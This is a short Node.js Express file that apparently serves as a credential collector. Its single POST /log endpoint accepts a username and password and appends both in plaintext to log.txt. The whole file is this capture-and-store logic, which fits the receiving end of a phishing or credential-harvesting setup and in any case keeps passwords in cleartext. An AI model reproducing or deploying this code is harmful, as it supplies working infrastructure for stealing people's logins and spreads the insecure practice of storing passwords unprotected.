const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post("/log", (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync("log.txt", logEntry);
  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Log server running on ${PORT}`));
